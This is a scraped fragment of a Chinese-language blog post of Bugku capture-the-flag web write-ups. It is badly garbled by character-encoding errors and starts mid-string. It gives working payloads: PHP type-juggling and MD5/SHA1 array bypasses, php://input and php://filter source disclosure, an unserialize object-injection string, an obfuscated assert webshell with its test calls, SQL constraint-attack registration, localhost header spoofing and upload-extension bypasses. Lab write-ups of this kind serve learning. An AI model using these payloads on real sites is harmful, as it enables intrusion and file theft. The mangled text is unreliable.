wQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB 1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E\u0026#34; print urllib.unquote(a) è¿™é‡Œé¢å‡ºæ¥çš„æ˜¯base64ç¼–ç çš„ä¸œè¥¿ï¼Œè§£ç å¾—åˆ°\n\u0026#34;;if(!$_GET[\u0026#39;id\u0026#39;]) header(\u0026#39;Location: hello.php?id=1\u0026#39;); exit(); } $id=$_GET[\u0026#39;id\u0026#39;]; $a=$_GET[\u0026#39;a\u0026#39;]; $b=$_GET[\u0026#39;b\u0026#39;]; if(stripos($a,\u0026#39;.\u0026#39;)) echo \u0026#39;no no no no no no no\u0026#39;; return ; } $data = @file_get_contents($a,\u0026#39;r\u0026#39;);//file_get_contents - å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥å­—ç¬¦ä¸² if($data==\u0026#34;bugku is a nice plateform!\u0026#34; and $id==0 and strlen($b)\u0026gt;5 and eregi(\u0026#34;111\u0026#34;.substr($b,0,1),\u0026#34;1114\u0026#34;) and substr($b,0,1)!=4) //eregiæ˜¯æ­£åˆ™åŒ¹é…å‡½æ•° require(\u0026#34;f4l2a3g.txt\u0026#34;); } else print \u0026#34;never never never give up !!!\u0026#34;; } ?\u0026gt; å…¶å®ç›´æ¥åœ¨urlé‡Œé¢å†™ä¸€ä¸ªf4l2a3g.txtå°±å¯ä»¥å¾—åˆ°flagäº†\næ­£è§£å¦‚ä¸‹ï¼š é¢˜ç›®çš„æ„æ€æ˜¯è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š\nidä¸ç­‰äº0\nidå¼±ç­‰äº0ï¼Œé‚£ä¹ˆæŸ¥çœ‹phpçš„è¡¨æ ¼å‘ç°å­—ç¬¦ä¸²å¼±ç­‰äº0ï¼Œæ‰€ä»¥è®©id=â€œijkâ€\nbçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ç­‰äº4ï¼Œåˆè¦è®©â€œ111â€.substr(b,0,1)å’Œâ€œ1114â€åŒ¹é…èµ·æ¥ã€‚eregiå‡½æ•°å¯ä»¥ç”¨æˆªæ–­å­—ç¬¦\\x00ç»•è¿‡ ä½†æ˜¯æ³¨æ„åœ¨è¾“å…¥urlçš„æ—¶å€™\\x00ä¼šè¢«è½¬ç ï¼Œå¯¼è‡´urlè¢«æˆªæ–­ã€‚æ³¨æ„ï¼Œè™½ç„¶ b=%0012345 å®é™…å­—ç¬¦ä¸²é•¿åº¦ä¸º 8 å­—èŠ‚ï¼Œ ä½†åœ¨åå°è„šæœ¬è¯»å…¥æ•°æ®æ—¶ï¼Œä¼šå°† URL ç¼–ç  %00 è½¬æ¢æˆ 1 å­—èŠ‚ã€‚æ‰€ä»¥è¯´ï¼Œç©ºå­—ç¬¦åº”è¯¥åœ¨åå°è„šæœ¬çš„å˜é‡ä¸­å‡ºç°ï¼Œ è€Œä¸æ˜¯åœ¨ URL æŸ¥è¯¢å­—ç¬¦ä¸²å˜é‡ä¸­å‡ºç°ã€‚\n$data æ˜¯ç”± file_get_contents() å‡½æ•°è¯»å–å˜é‡ $a çš„å€¼è€Œå¾—ï¼Œæ‰€ä»¥ $a çš„å€¼å¿…é¡»ä¸ºæ•°æ®æµã€‚ åœ¨æœåŠ¡å™¨ä¸­è‡ªå®šä¹‰ä¸€ä¸ªå†…å®¹ä¸º bugku is a nice plateform! æ–‡ä»¶ï¼Œå†æŠŠæ­¤æ–‡ä»¶è·¯å¾„èµ‹å€¼ç»™ $aï¼Œæ˜¾ç„¶ä¸å¤ªç°å®ã€‚ ä¼ªåè®® php:// æ¥è®¿é—®è¾“å…¥è¾“å‡ºçš„æ•°æ®æµï¼Œå…¶ä¸­ php://input å¯ä»¥è®¿é—®åŸå§‹è¯·æ±‚æ•°æ®ä¸­çš„åªè¯»æµã€‚\næ‰€ä»¥æ„é€ å¦‚ä¸‹ï¼š\nid=\u0026quot;int\u0026quot;\u0026amp;b=%0012345\u0026amp;a=php://input å¹¶åœ¨burpçš„è¯·æ±‚å¤´ä¸­æ·»åŠ bugku is a nice plateform! welcome to the bugkuctf è¿›å…¥æºä»£ç ç•Œé¢ï¼Œfile_get_contentsè¯´æ˜å¾—æ˜¯æ•°æ®æµï¼Œçœ‹åˆ°hint.php,ç„¶åå†æ£€ç´¢æ¡†é‡Œé¢è¾“å…¥ï¼š\nindex.php?txt=php://input\u0026amp;file=hint.php å¹¶ä¸”åœ¨burpsuiteä¸­æ·»åŠ welcome to thebugkuctf å¾—åˆ°çš„åªæ˜¯hint.phpçš„æ•ˆæœç•Œé¢ï¼Œè¦çœ‹åˆ°hintçš„æºç ï¼Œè¦è¿™æ ·è¾“å…¥\nindex.php?txt=php://input\u0026amp;file=php://filter/read=convert.base64-encode/resource=hint.php è¾“å‡ºä¸€å †base64ç¼–ç ï¼Œè§£ç å¾—åˆ°\n\u0026lt;?php class Flag{//flag.php public $file; public function __tostring(){ if(isset($this-\u0026gt;file)){ echo file_get_contents($this-\u0026gt;file); echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; return (\u0026#34;good\u0026#34;); } } } ?\u0026gt; åŒæ ·çš„é“ç†ï¼Œä½¿ç”¨ index.php?txt=php://input\u0026amp;file=php://filter/read=convert.base64-encode/resource=index.php\nè§£ç å¾—åˆ°äº†index.phpçš„æºä»£ç ã€‚\n\u0026lt;?php $txt = $_GET[\u0026#34;txt\u0026#34;]; $file = $_GET[\u0026#34;file\u0026#34;]; $password = $_GET[\u0026#34;password\u0026#34;]; if(isset($txt)\u0026amp;\u0026amp;(file_get_contents($txt,\u0026#39;r\u0026#39;)===\u0026#34;welcome to the bugkuctf\u0026#34;)){ echo \u0026#34;hello friend!\u0026lt;br\u0026gt;\u0026#34;; if(preg_match(\u0026#34;/flag/\u0026#34;,$file)){ echo \u0026#34;ä¸èƒ½ç°åœ¨å°±ç»™ä½ flagå“¦\u0026#34;; exit(); }else{ include($file); $password = unserialize($password); echo $password; } }else{ echo \u0026#34;you are not the number of bugku ! \u0026#34;; } ?\u0026gt; \u0026lt;!-- $user = $_GET[\u0026#34;txt\u0026#34;]; $file = $_GET[\u0026#34;file\u0026#34;]; $pass = $_GET[\u0026#34;password\u0026#34;]; if(isset($user)\u0026amp;\u0026amp;(file_get_contents($user,\u0026#39;r\u0026#39;)===\u0026#34;welcome to the bugkuctf\u0026#34;)){ echo \u0026#34;hello admin!\u0026lt;br\u0026gt;\u0026#34;; include($file); //hint.php }else{ echo \u0026#34;you are not admin ! \u0026#34;; } --\u0026gt; æ˜¾ç„¶è¿™é‡Œä¸è®©æˆ‘ä»¬å†fileä¸­è¾“å…¥flagæ–‡ä»¶åã€‚ä½†æ˜¯Flagç±»åœ¨æ„é€ å¯¹è±¡çš„æ—¶å€™ä¼šæ‰§è¡Œæ„é€ å‡½æ•°ï¼Œè¿™ä¸ªæ—¶å€™ æœ‰æœºä¼šechoå‡ºæˆ‘ä»¬è¦çš„æ–‡ä»¶ã€‚ä½†æ˜¯è¦æ€ä¹ˆåˆ©ç”¨passwordæ¥ä¼ å…¥æˆ‘ä»¬è¦çš„å¯¹è±¡å‘¢ï¼Ÿçœ‹åˆ°äº†unseializeååºåˆ—å‡½æ•° è¿™ä¸ªå‡½æ•°å¯ä»¥æŠŠå¯¹è±¡ä»åºåˆ—åŒ–çš„å­—ç¬¦ä¸²è¿˜åŸå‡ºå¯¹è±¡æ¥.åœ¨PHPä¸­,åºåˆ—åŒ–ç”¨äºå­˜å‚¨æˆ–ä¼ é€’PHP çš„å€¼çš„è¿‡ç¨‹ä¸­,åŒæ—¶ä¸ä¸¢å¤±å…¶ç±»å‹å’Œç»“æ„\næ‰€ä»¥æˆ‘ä»¬ç¼–å†™å¦‚ä¸‹ä»£ç ï¼š\n\u0026lt;?php Class Flag{ public $file=\u0026#39;flag.php\u0026#39; } $a = new Flag; echo serialize($a); ?\u0026gt; è¾“å‡ºO:4:\u0026ldquo;Flag\u0026rdquo;:1:{s:4:\u0026ldquo;file\u0026rdquo;;s:8:\u0026ldquo;flag.php\u0026rdquo;;}\näºæ˜¯ä¼ å…¥å‚æ•°index.php?txt=welcome to the bugkuctf\u0026amp;file=hint.php\u0026amp;password=O:4:\u0026ldquo;Flag\u0026rdquo;:1:{s:4:\u0026ldquo;file\u0026rdquo;;s:8:\u0026ldquo;flag.php\u0026rdquo;;}\nå¾—åˆ°flag\nè¿‡ç‹—ä¸€å¥è¯ åˆšå¼€å§‹ç»™æˆ‘ä»¬çš„phpä»£ç ï¼š\n\u0026lt;?php $poc=\u0026#34;a#s#s#e#r#t\u0026#34;; $poc_1=explode(\u0026#34;#\u0026#34;,$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[\u0026#39;s\u0026#39;]) ?\u0026gt; çœ‹æ„æ€explodeå°±æ˜¯æ ¹æ®ç¬¬ä¸€å‚æ•°çš„è§„åˆ™å°†ç›®æ ‡åˆ’åˆ†ä¸ºä¸€ä¸ªæ•°ç»„ã€‚é‚£ä¹ˆpro2å°±æ˜¯assertçš„æ„æ€ assertï¼ˆï¼‰ä¸€ä¸ªä¸œè¥¿ï¼Œå¦‚æœå­—ç¬¦ä¸²ä¼šè¢«å½“åšä»£ç æ‰§è¡Œï¼Œå¦åˆ™æ˜¯false\nä»¥ä¸‹è§£æ³• è¯•æ¢ä¸€ä¸‹ï¼š?index.php?s=phpinfo();//å¯ä»¥æ­£å¸¸æ‰§è¡Œ ?index.php?s=print_r(scandir(./)) //./çš„æ„æ€åº”è¯¥æ˜¯åœ¨å½“å‰ç›®å½•ä¸‹ï¼Œscanæ‰«æç›®å½•æ–‡ä»¶è¿”å›ä¸€ä¸ªæ•°ç»„\næ˜¾ç¤ºäº†flagæ‰€å¤„çš„txtæ–‡ä»¶å¤¹ï¼Œä¹‹åç”¨var_dump()æˆ–è€…show_source()æˆ–è€…ç›´æ¥è®¿é—®éƒ½å¯ä»¥ å­—ç¬¦ï¼Ÿæ­£åˆ™ï¼Ÿ æ‰“å¼€ç½‘é¡µï¼Œè¦æ±‚åŒ¹é…çš„æ­£åˆ™å¼å­å¦‚ä¸‹ï¼š\n/key.*key.{4,7}key:\\/.\\/(.*key)[a-z][[:punct:]]/i /ã€‚ã€‚ã€‚ã€‚/è¿™å¯¹ä¸œè¥¿æ ‡å¿—æ­£åˆ™è¡¨è¾¾å¼çš„å¼€å¤´å’Œç»“å°¾ï¼Œç±»ä¼¼çš„è¿˜æœ‰#ã€‚ã€‚ã€‚#ç­‰\n[[:punct:]] ï¼šåŒ¹é…ä»»ä½•æ ‡ç‚¹ç¬¦å·ï¼›\n/i ï¼šè¡¨ç¤ºè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼å¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼› ä¸€å¼€å§‹æˆ‘å†™çš„åŒ¹é…å¯¹è±¡æ˜¯è¿™æ ·çš„ï¼š\nhttp://123.206.87.240:8002/web10/?id=keykey00000key://keyb. ä½†æ˜¯å¤±è´¥åŸå› æ˜¯åœ¨æœ€åä¸¤ä¸ªæ–œæ ä¸Šï¼Œä»–ä»¬åœ¨urlè¾“å…¥çš„æ—¶å€™å‰ä¸€ä¸ªä¼šå……å½“è½¬ä¹‰ä½œç”¨ï¼Œå®é™…è¾“å…¥çš„åªæœ‰ä¸€ä¸ª/ å˜æˆè¿™æ ·å°±å¥½äº†ï¼š\nhttp://123.206.87.240:8002/web10/?id=keykey00000key:///keyb. å‰å¥³å‹ æ‰“å¼€æºä»£ç ï¼Œå‘ç°åœ¨é“¾æ¥å¤„æœ‰ä¸ªé“¾æ¥ï¼Œç‚¹è¿›å…¥æ˜¯phpä»£ç \n\u0026lt;?php if(isset($_GET[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v3\u0026#39;])){ $v1 = $_GET[\u0026#39;v1\u0026#39;]; $v2 = $_GET[\u0026#39;v2\u0026#39;]; $v3 = $_GET[\u0026#39;v3\u0026#39;]; if($v1 != $v2 \u0026amp;\u0026amp; md5($v1) == md5($v2)){ if(!strcmp($v3, $flag)){ echo $flag; } } } ?\u0026gt; å¯¹äºè¿™é‡Œçš„md5ï¼Œæ—¢å¯ä»¥é‡‡ç”¨md5ç¢°æ’çš„æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥è®©ä¸¤ä¸ªå˜é‡éƒ½åœ¨è¾“å…¥çš„æ—¶å€™å£°æ˜ä¸ºæ•°ç»„å¾—åˆ°false=false ï¼Œå¯¹äºè¿™é‡Œçš„strcmpå¯ä»¥è¯•è¯•æŠŠv3å£°æ˜ä¸ºä¸€ä¸ªä¸ç¬¦åˆæ•°æ®ç±»å‹çš„ä¸œè¥¿æ¯”å¦‚è¯´æ•´æ•°ï¼Œè¿™æ ·å¯ä»¥è®©å‡½æ•°è¿”å›0(ä»…å¯¹php5.3ä¹‹å‰ç‰ˆæœ¬æœ‰æ•ˆ)\nhttp://123.206.31.85:49162/index.php?v1=s878926199a\u0026amp;v2=s155964671a\u0026amp;v3[]=1 æˆ–è€… http://123.206.31.85:49162/index.php?v1[]=1\u0026amp;v2[]=2\u0026amp;v3[]=1 login1 æ‰“å¼€ä¹‹åæ˜¯ç™»é™†ç•Œé¢ï¼Œæç¤ºè¯´æ˜¯sqlçº¦æŸæ”»å‡»ï¼Œå…·ä½“åšå®¢æ•™ç¨‹çœ‹è¿™é‡Œsqlçº¦æŸæ”»å‡»\næ€»è€Œè¨€ä¹‹ä¸ºäº†åˆ›å»ºä¸€ä¸ªæ–°çš„adminï¼Œæˆ‘ä»¬æ³¨å†Œä»¥ä¸‹è´¦æˆ·ï¼š\nusernameï¼šadmin 1 passwordï¼š2017zxwlB æ³¨å†Œçš„æ—¶å€™ï¼Œä¼šé¦–å…ˆæŸ¥çœ‹æ˜¯å¦æœ‰ç›¸åŒçš„ç”¨æˆ·åï¼Œä½†æ˜¯å› ä¸ºselectæŸ¥è¯¢è¯­å¥å¹¶ä¸å¯¹è¶…å‡ºæœ€å¤§é•¿åº¦é™ åˆ¶çš„æ£€ç´¢å¯¹è±¡è¿›è¡Œå°¾éƒ¨ä¿®å‰ªï¼Œæ‰€ä»¥åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ³¨å†Œçš„ç”¨æˆ·ååœ¨æ•°æ®åº“ä¸­å¹¶ä¸å­˜åœ¨ã€‚\næ—¢ç„¶ä¸å­˜åœ¨ï¼Œå°±ä¼šå‘è¡¨ä¸­æ’å…¥è¿™æ¡æ–°çš„ç”¨æˆ·æ•°æ®ï¼Œä½†æ˜¯ç”±äºè¶…å‡ºäº†varchar()æ‰€è§„å®šçš„é•¿åº¦ï¼Œæ‰€ä»¥ è¶…å‡ºéƒ¨åˆ†ä¼šè¢«æˆªæ–­ï¼Œè¿™æ˜¯ç¬¬ä¸€é‡å¤„ç†ï¼Œæ¥ä¸‹æ¥æ•°æ®åº“ä¼šæŠŠæœ‰æ•ˆå­—ç¬¦åé¢çš„ç©ºæ ¼éƒ½åˆ æ‰ï¼Œè¿™æ˜¯ç¬¬äºŒé‡å¤„ç† ç”±æ­¤æˆ‘ä»¬æ’å…¥äº†ä¸€ä¸ªadminç”¨æˆ·ï¼Œä½¿ç”¨çš„æ˜¯è‡ªå·±çš„å¯†ç å°±å¯ä»¥ç™»é™†\nç™»é™†å°±å¥½äº†ã€‚\nä½ ä»å“ªé‡Œæ¥ é¢˜ç›®è¯´ ä½ æ˜¯ä»è°·æ­Œæ¥çš„å—ï¼Ÿï¼Œåœ¨burpsuiteä¸­æ·»åŠ referer:https://www.google.comå°±å¯ä»¥äº†\nmd5 collision ä»å†å²write upä¸­è®°å½•çš„è½¬åŒ–åçš„å€¼ä¸º0çš„md5ç ä¸­é€‰ä¸¤ä¸ªå‡ºæ¥ä½œä¸ºå‚æ•°å°±å¯ä»¥äº†\nç¨‹åºå‘˜æœ¬åœ°ç½‘ç«™ è¦æ±‚ä»æœ¬åœ°è®¿é—®ï¼Œåœ¨burpsuiteä¸­æ·»åŠ ä¸€æ¡x-forwarded-for:127.0.0.1å°±å¯ä»¥äº†ï¼\nå„ç§ç»•è¿‡ æ‰“å¼€ç½‘é¡µä¹‹åçœ‹åˆ°çš„ä»£ç å¦‚ä¸‹\n\u0026lt;?php highlight_file(\u0026#39;flag.php\u0026#39;); $_GET[\u0026#39;id\u0026#39;] = urldecode($_GET[\u0026#39;id\u0026#39;]); $flag = \u0026#39;flag{xxxxxxxxxxxxxxxxxx}\u0026#39;; if (isset($_GET[\u0026#39;uname\u0026#39;]) and isset($_POST[\u0026#39;passwd\u0026#39;])) { if ($_GET[\u0026#39;uname\u0026#39;] == $_POST[\u0026#39;passwd\u0026#39;]) print \u0026#39;passwd can not be uname.\u0026#39;; else if (sha1($_GET[\u0026#39;uname\u0026#39;]) === sha1($_POST[\u0026#39;passwd\u0026#39;])\u0026amp;($_GET[\u0026#39;id\u0026#39;]==\u0026#39;margin\u0026#39;)) die(\u0026#39;Flag: \u0026#39;.$flag); else print \u0026#39;sorry!\u0026#39;; } ?\u0026gt; sha1æ˜¯æ•£åˆ—ç®—æ³•å‡½æ•°ï¼Œè¿”å›æ•£åˆ—å€¼ã€‚è¿™é‡Œä¼ å…¥ä¸¤ä¸ªä¸ç¬¦åˆæ•°æ®ç±»å‹çš„æ•°æ®æ¥è®©ä¸¤ä¸ªéƒ½è¿”å›falseå°±å¯ä»¥åšåˆ°ç›¸ç­‰ ï¼Œé‚£ä¹ˆå°±è®©unameå£°æ˜æˆä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå¹¶ä¸”ç”¨hackbarä¼ ä¸€ä¸ªæ•°ç»„ç±»å‹çš„passwdè¿›å»ã€‚id=marginå°±è¡Œäº†ã€‚\nweb8 æ‰“å¼€ç½‘ç«™æ˜¾ç¤ºä»£ç \n\u0026lt;?php extract($_GET);//è§£ææ‰€æœ‰é€šè¿‡getæ–¹å¼è·å–çš„å˜é‡ if (!empty($ac)) { $f = trim(file_get_contents($fn));//ä»æ‰“å¼€fnæ‰€ä»£è¡¨çš„æ–‡ä»¶ï¼Œæˆ–è€…æ˜¯æ–‡ä»¶æµ if ($ac === $f)//å¼ºç­‰äº { echo \u0026#34;\u0026lt;p\u0026gt;This is flag:\u0026#34; .\u0026#34; $flag\u0026lt;/p\u0026gt;\u0026#34;; } else { echo \u0026#34;\u0026lt;p\u0026gt;sorry!\u0026lt;/p\u0026gt;\u0026#34;; } } ?\u0026gt; å¯çŸ¥æœ‰ä¸¤ç§è§£æ³•ï¼š\nè§£æ³•ä¸€ï¼šåˆ©ç”¨php://inputä¼ å…¥fnä¸€ä¸ªå€¼å¹¶è®©ä»–å’Œacç›¸ç­‰(è¿™é‡Œå¾ˆå¥‡æ€ªæˆ‘çš„hackbarä¸èƒ½ç»™php://inputä¼ æ•°æ®ï¼Œä½†æ˜¯burpsuiteåº”è¯¥å¯ä»¥)\nè§£æ³•äºŒï¼šæ ¹æ®é¢˜ç›®æç¤ºï¼ŒçŒœæµ‹æœ‰flag.txtåœ¨åŒçº§ç›®å½•ä¸‹ï¼Œè®¿é—®ä¹‹çœ‹åˆ°æ–‡ä»¶å†…å®¹æ˜¾ç¤ºflagsï¼Œ é‚£ä¹ˆè®©ac=flagsï¼Œfn=flag.txtå°±å¯ä»¥å¾—åˆ°flagäº†ã€‚\nç»†å¿ƒ ä½¿ç”¨å¾¡å‰‘è½¯ä»¶æ‰«æç½‘ç«™ï¼Œå‘ç°æœ‰robots.txt,ç‚¹è¿›å»æ˜¾ç¤º\nUser-agent: * Disallow: /resusl.php è®¿é—®è¿™ä¸ªphpæ–‡ä»¶è¯•è¯•ï¼Œçœ‹åˆ°äº†æ˜¾ç¤ºé‡Œå¤´è­¦å‘Šä¸æ˜¯ç®¡ç†å‘˜ç™»é™†ï¼Œè‡ªå·±çš„ipå·²ç»è¢«è®°å½•ï¼Œç¬¬ä¸€ååº”æ˜¯ä¼ªé€ æœ¬åœ°è®¿é—®\nHost: 127.0.0.1 Referer: 127.0.0.1 X-Forwarded-For: 127.0.0.1 Client-IP: 127.0.0.1 X-Remote-IP: 127.0.0.1 X-Originating-IP: 127.0.0.1 X-Remote-Addr: 127.0.0.1 è¿™å‡ ç§æ–¹å¼éƒ½å¯ä»¥åœ¨burpsuiteä¸­è¿›è¡Œä¿®æ”¹æ¥ä¼ªé€ æœ¬åœ°è®¿é—®ã€‚(ä½†æ˜¯é¢˜ç›®çš„è€ƒç‚¹ä¼¼ä¹å¹¶ä¸åœ¨æ­¤)\næ¥ä¸‹æ¥æ˜¾ç¤º\nBy bugkuctf. if ($_GET[x]==$password) æ­¤å¤„çœç•¥1wå­— è¯•ä¸€è¯•æŠŠxèµ‹å€¼æˆadminè¯•ä¸€è¯•ï¼Ÿåˆšå¼€å§‹é¢˜ç›®çš„æ–‡å­—ä¿¡æ¯å°±è®©æˆ‘ä»¬è¯•è¯•æ„é€ äº†adminï¼Œæœç„¶æœ‰äº†flag\nrobots.txtæ˜¯ä¸€ä¸ªçº¯æ–‡æœ¬æ–‡ä»¶ï¼Œåœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ç½‘ç«™ç®¡ç†è€…å¯ä»¥å£°æ˜è¯¥ç½‘ç«™ä¸­ä¸æƒ³è¢«æœç´¢å¼•æ“è®¿ é—®çš„éƒ¨åˆ†ï¼Œæˆ–è€…æŒ‡å®šæœç´¢å¼•æ“åªæ”¶å½•æŒ‡å®šçš„å†…å®¹ã€‚ å½“ä¸€ä¸ªæœç´¢å¼•æ“ï¼ˆåˆç§°æœç´¢æœºå™¨äººæˆ–èœ˜è››ç¨‹åºï¼‰è®¿é—®ä¸€ä¸ªç«™ç‚¹æ—¶å™¨äººå°±ä¼šæŒ‰ç…§è¯¥æ–‡ä»¶ä¸­çš„å†…å®¹æ¥ ç¡®å®šè®¿é—®çš„èŒƒå›´ï¼›å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œé‚£ä¹ˆæœç´¢æœºå™¨äººå°±æ²¿ç€é“¾æ¥æŠ“å–ã€‚ æ±‚getshellï¼ˆæ–‡ä»¶ä¸Šä¼ ç±»å‹ï¼‰ æ‰“å¼€é¡µé¢ï¼Œè¦æ±‚å‘é€å›¾ç‰‡æ–‡ä»¶è€Œä¸æ˜¯phpæ–‡ä»¶ã€‚çœ‹ç½‘ä¸Šè¯´æ˜¯é»‘åå•è¿‡æ»¤å’Œç±»å‹æ£€æµ‹ï¼Œä½†æ˜¯å¯ä»¥æŠŠ content-type è¿›è¡Œå¤§å°å†™ç»•è¿‡å’Œç±»å‹ä¿®æ”¹ï¼Œå¹¶ä¸”ä¿®æ”¹phpæ–‡ä»¶çš„åç¼€åï¼Œå¯ä»¥ä¿®æ”¹æˆä»¥ä¸‹å‡ ç§\nphp2, php3, php4, php5, phps, pht, phtm, phtml è¯•äº†ä»¥ä¸Šå‡ ç§ä¹‹åï¼Œphp5å¯ä»¥æ‹¿åˆ°flagã€‚\n","permalink":"https://dragonbox.top/posts/ctf-bugku-writeup/","summary":"\u003cblockquote\u003e\n\u003cp\u003eçºªå¿µé‚£æ®µå²æœˆ\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"web3\"\u003eweb3\u003c/h2\u003e\n\u003cp\u003eç½‘ç«™é‡Œé¢å¾ªç¯å¼¹å‡ºæç¤ºæ¡†ï¼Œç”¨chromeçš„å¼€å‘è€…å·¥å…·æ‰“å¼€ä¸€ç‰‡ç©ºç™½ï¼Œ\nç”¨ctrl+uæŸ¥çœ‹æºä»£ç ï¼Œå‘ç°ä¸€ä¸²\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e  \u0026lt;!--\u0026amp;#75;\u0026amp;#69;\u0026amp;#89;\u0026amp;#123;\u0026amp;#74;\u0026amp;#50;\u0026amp;#115;\n  \u0026amp;#97;\u0026amp;#52;\u0026amp;#50;\u0026amp;#97;\u0026amp;#104;\u0026amp;#74;\u0026amp;#75;\u0026amp;#45;\n  \u0026amp;#72;\u0026amp;#83;\u0026amp;#49;\u0026amp;#49;\u0026amp;#73;\u0026amp;#73;\u0026amp;#73;\u0026amp;#125;--\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eè¿™æ˜¯unicodeï¼Œè½¬ç å³å¯\u003c/p\u003e\n\u003ch2 id=\"ä½ å¿…é¡»è®©ä»–åœä¸‹æ¥\"\u003eä½ å¿…é¡»è®©ä»–åœä¸‹æ¥ï¼\u003c/h2\u003e\n\u003cp\u003eæŸ¥çœ‹æºä»£ç ç«Ÿç„¶ç›´æ¥æœ‰flagäº†ï¼Œç½‘ä¸Šçš„è§£æ³•æ˜¯æŠ“åŒ…\u003c/p\u003e\n\u003ch2 id=\"æœ¬åœ°åŒ…å«\"\u003eæœ¬åœ°åŒ…å«\u003c/h2\u003e\n\u003cp\u003eè§£æ³•:åˆ©ç”¨hellowæ„é€ payload\n$_REQUESTï¼šé»˜è®¤æƒ…å†µä¸‹åŒ…å«äº† $_GETï¼Œ$_POST å’Œ $_COOKIE çš„æ•°ç»„ã€‚\nvar_dump():æ­¤å‡½æ•°æ˜¾ç¤ºæœ‰å…³åŒ…å«å…¶ç±»å‹å’Œå€¼çš„ä¸€ä¸ªæˆ–å¤šä¸ªè¡¨è¾¾å¼çš„ç»“æ„åŒ–ä¿¡æ¯ã€‚\né€’å½’åœ°æ¢ç´¢æ•°ç»„å’Œå¯¹è±¡ï¼Œå…¶ä¸­å€¼ç¼©è¿›ä»¥æ˜¾ç¤ºç»“æ„ã€‚åœ¨è¿™é¢˜é‡Œé¢åªæ˜¯æ˜¾ç¤ºå˜é‡çš„ç±»å‹ï¼Œå¯¹\nevalå¹¶æ— å½±å“ï¼Œå¯¹äºevalæ¥è¯´ï¼Œå’Œevalï¼ˆ$aï¼‰æ˜¯ä¸€æ ·çš„ã€‚\u003c/p\u003e\n\u003cp\u003epayloadï¼š/index.php?hello = show_source(\u0026lsquo;flag.php\u0026rsquo;)\nç½‘ä¸Šçš„payloadï¼š/index.php?hello=1);show_source(\u0026lsquo;flag.php\u0026rsquo;);var_dump(\u003c/p\u003e\n\u003ch2 id=\"åŸŸåè§£æ\"\u003eåŸŸåè§£æ\u003c/h2\u003e\n\u003cp\u003eç¼–è¾‘etc/hostsæ·»åŠ ä¸€æ¡123.206.87.240\t flag.bugku.comï¼Œ\nåœ¨æµè§ˆå™¨ä¸­æ‰“å¼€flag.bugku.comå³å¯å¾—åˆ°flagã€‚\u003c/p\u003e\n\u003cp\u003eåæ€ï¼šhostè¯·æ±‚å¤´æ˜¯http1.1æ·»åŠ çš„ä¸œè¥¿ï¼Œ\næ·»åŠ åŸŸåè§£æä¹‹åç›´æ¥è®¿é—®123.206.87.240å´æ˜¾ç¤º403ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨httpsä¸‹ä¸»æœºåå¿…ä¸å¯å°‘ã€‚\u003c/p\u003e\n\u003cp\u003eæ·»åŠ hostä¹‹å‰è®¿é—®ipåœ°å€ç»“æœæ˜¾ç¤ºé”™è¯¯400ï¼ˆç¼ºå°‘hostï¼‰\næ·»åŠ hostä¹‹åè®¿é—®ipåœ°å€ç»“æœæ˜¾ç¤ºé”™è¯¯403ï¼ˆè¯»å–è®¿é—®è¢«ç¦ï¼‰\u003c/p\u003e\n\u003ch2 id=\"ä½ å¿…é¡»è®©ä»–åœä¸‹\"\u003eä½ å¿…é¡»è®©ä»–åœä¸‹\u003c/h2\u003e\n\u003cp\u003eä½¿ç”¨burpsuiteçš„repeateråŠŸèƒ½è¿›è¡ŒæŠ“åŒ…æ“ä½œï¼Œ\né€šè¿‡å¤šæ¬¡ç‚¹å‡»goï¼Œæœ€ç»ˆå‘ç°åœ¨åŸå…ˆæ˜¯â€œflag is hereâ€çš„ä½ç½®å‡ºç°äº†flag\u003c/p\u003e\n\u003ch2 id=\"å˜é‡1\"\u003eå˜é‡1\u003c/h2\u003e\n\u003cp\u003eå‡½æ•°çŸ¥è¯†ï¼š\nissetï¼ˆï¼‰åˆ¤æ–­æ˜¯å¦æœ‰è¾“å…¥\npre_matchæ˜¯æ­£åˆ™è¡¨è¾¾å¼ï¼Œå¼•å·ä¸­çš„å†…å®¹éƒ½ä»¥/^å¼€å¤´ï¼Œä»¥$/ç»“å°¾ï¼Œ\\w+çš„æ„æ€æ˜¯0\u003cdel\u003e9 a\u003c/del\u003ez A~Zï¼Œ\nè¾“å…¥çš„å†…å®¹è¢«é™å®šäº†ï¼Œæ‰€ä»¥ä¸èƒ½è¾“å…¥ä»£ç \u003c/p\u003e\n\u003cp\u003eè¾“å…¥arg=GLOBALSï¼Œä»ä»£ç ä¸­å¯çŸ¥ä¼šç»™GLOBALSå†å¥—ä¸Šä¸€ä¸ª$ï¼Œå°±è¾“å‡ºäº†flag\u003c/p\u003e\n\u003ch2 id=\"web5\"\u003eWeb5\u003c/h2\u003e\n\u003cp\u003eæŸ¥çœ‹æºä»£ç ï¼Œå‘ç°jotherç¼–ç ï¼Œæ‰“å¼€æ§åˆ¶å°è¾“å…¥å°±è¡Œäº†\u003c/p\u003e\n\u003ch2 